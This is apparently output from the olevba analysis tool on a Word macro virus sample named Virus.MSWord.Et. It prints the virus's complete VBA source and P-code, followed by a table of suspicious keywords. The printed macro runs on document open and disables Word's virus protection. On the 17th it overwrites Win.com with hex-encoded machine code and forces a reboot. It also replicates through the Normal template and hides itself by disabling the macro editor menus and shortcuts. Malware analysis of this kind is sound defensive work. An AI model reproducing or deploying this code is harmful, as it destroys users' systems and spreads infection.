olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Et
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Et - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ET_No1.bas 
in file: Virus.MSWord.Et - OLE stream: 'Macros/VBA/ET_No1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Attribute GetWindowsDirectory.VB_ProcData.VB_Invoke_Func = "ProVirus.Virus.AutoOpen"
Private Declare Function ExitWindowsEx Lib "User32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Sub AutoOpen()
'
Dim DD As Byte

    On Error Resume Next
    
    Options.VirusProtection = False
    
    If Day(Date) = 17 Then
        Txt1 = "E9FD09"
        Txt2 = "B80103BB0080B90100BA8000CD13E9FC04"
        windir$ = String(144, " ")
        l = GetWindowsDirectory(windir$, 144)
        windir = Left(windir$, l)
        Open windir + "\Win.com" For Binary Access Write Lock Read As #1
            For i = 1 To 3
                DD = "&H" + Mid(Txt1, 2 * i - 1, 2)
                Put #1, , DD
            Next i
            For i = 1 To 17
                DD = "&H" + Mid(Txt2, 2 * i - 1, 2)
                Put #1, 2560 + i, DD
            Next i
        Close #1
        Call ExitWindowsEx(6, 0)
    End If
       
       DocName = ActiveDocument.Path + "\" + ActiveDocument.Name
       DotName = NormalTemplate.Path + "\" + NormalTemplate.Name
    If CommandBars("Visual Basic").Controls(1).Caption <> "ETKill" Then
       Application.OrganizerDelete Source:=DotName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=DocName, Destination:=DotName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
       DelTools
       CustomizationContext = NormalTemplate
       FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
       CustomizationContext = NormalTemplate
       FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
       For k = 1 To CommandBars("Visual Basic").Controls.Count
            CommandBars("Visual Basic").Controls(1).Delete
       Next k
       Set MyFlag = CommandBars("Visual Basic").Controls.Add(Type:=msoControlButton, ID:=752)
       MyFlag.FaceId = 30
       CommandBars("Visual Basic").Controls(1).Caption = "ETKill"
       NormalTemplate.Save
    Else
       Application.OrganizerCopy Source:=DotName, Destination:=DocName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
       ActiveDocument.Save
    End If
End Sub

Sub DelTools()
    For i = 1 To CommandBars("Tools").Controls.Count
       If CommandBars("Tools").Controls(i).Caption = "ºê(&M)" Then
            CommandBars("Tools").Controls(i).Delete
            Exit For
       End If
    Next i
    For i = 1 To CommandBars("Tools").Controls.Count
       If CommandBars("Tools").Controls(i).Caption = "×Ô¶¨Òå(&C)..." Then
            CommandBars("Tools").Controls(i).Delete
            Exit For
       End If
    Next i
    Application.OnTime When:=Now + TimeValue("00:0:01"), Name:="DelTools"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Et
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/ET_No1 - 4814 bytes
' Line #0:
' 	FuncDefn (Private Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #1:
' 	FuncDefn (Private Declare Function ExitWindowsEx Lib "User32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long)
' Line #2:
' 	FuncDefn (Sub AutoOpen())
' Line #3:
' 	QuoteRem 0x0000 0x0000 ""
' Line #4:
' 	Dim 
' 	VarDefn DD (As Byte)
' Line #5:
' Line #6:
' 	OnError (Resume Next) 
' Line #7:
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' Line #10:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0006 "E9FD09"
' 	St Txt1 
' Line #12:
' 	LitStr 0x0022 "B80103BB0080B90100BA8000CD13E9FC04"
' 	St Txt2 
' Line #13:
' 	LitDI2 0x0090 
' 	LitStr 0x0001 " "
' 	ArgsLd String$ 0x0002 
' 	St windir$ 
' Line #14:
' 	Ld windir$ 
' 	LitDI2 0x0090 
' 	ArgsLd GetWindowsDirectory 0x0002 
' 	St l 
' Line #15:
' 	Ld windir$ 
' 	Ld l 
' 	ArgsLd LBound 0x0002 
' 	St windir 
' Line #16:
' 	Ld windir 
' 	LitStr 0x0008 "\Win.com"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Write Lock Read)
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #18:
' 	LitStr 0x0002 "&H"
' 	Ld Txt1 
' 	LitDI2 0x0002 
' 	Ld i 
' 	Mul 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St DD 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Ld DD 
' 	PutRec 
' Line #20:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0011 
' 	For 
' Line #22:
' 	LitStr 0x0002 "&H"
' 	Ld Txt2 
' 	LitDI2 0x0002 
' 	Ld i 
' 	Mul 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St DD 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0A00 
' 	Ld i 
' 	Add 
' 	Ld DD 
' 	PutRec 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #26:
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	ArgsCall (Call) ExitWindowsEx 0x0002 
' Line #27:
' 	EndIfBlock 
' Line #28:
' Line #29:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St DocName 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd New 
' 	Add 
' 	St DotName 
' Line #31:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	LitStr 0x0006 "ETKill"
' 	Ne 
' 	IfBlock 
' Line #32:
' 	Ld DotName 
' 	ParamNamed Source 
' 	LitStr 0x0006 "ET_No1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #33:
' 	Ld DocName 
' 	ParamNamed Source 
' 	Ld DotName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "ET_No1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	ArgsCall DelTools 0x0000 
' Line #35:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #36:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #37:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #38:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #39:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #40:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #41:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	SetStmt 
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x02F0 
' 	ParamNamed ID 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	ArgsMemLd Add 0x0002 
' 	Set MyFlag 
' Line #43:
' 	LitDI2 0x001E 
' 	Ld MyFlag 
' 	MemSt FaceId 
' Line #44:
' 	LitStr 0x0006 "ETKill"
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #45:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #46:
' 	ElseBlock 
' Line #47:
' 	Ld DotName 
' 	ParamNamed Source 
' 	Ld DocName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "ET_No1"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndSub 
' Line #51:
' Line #52:
' 	FuncDefn (Sub DelTools())
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #54:
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	LitStr 0x0006 "ºê(&M)"
' 	Eq 
' 	IfBlock 
' Line #55:
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #56:
' 	ExitFor 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	MemLd Controls 
' 	MemLd Count 
' 	For 
' Line #60:
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	LitStr 0x000D "×Ô¶¨Òå(&C)..."
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld i 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #62:
' 	ExitFor 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	Ld Now 
' 	LitStr 0x0007 "00:0:01"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0008 "DelTools"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #66:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

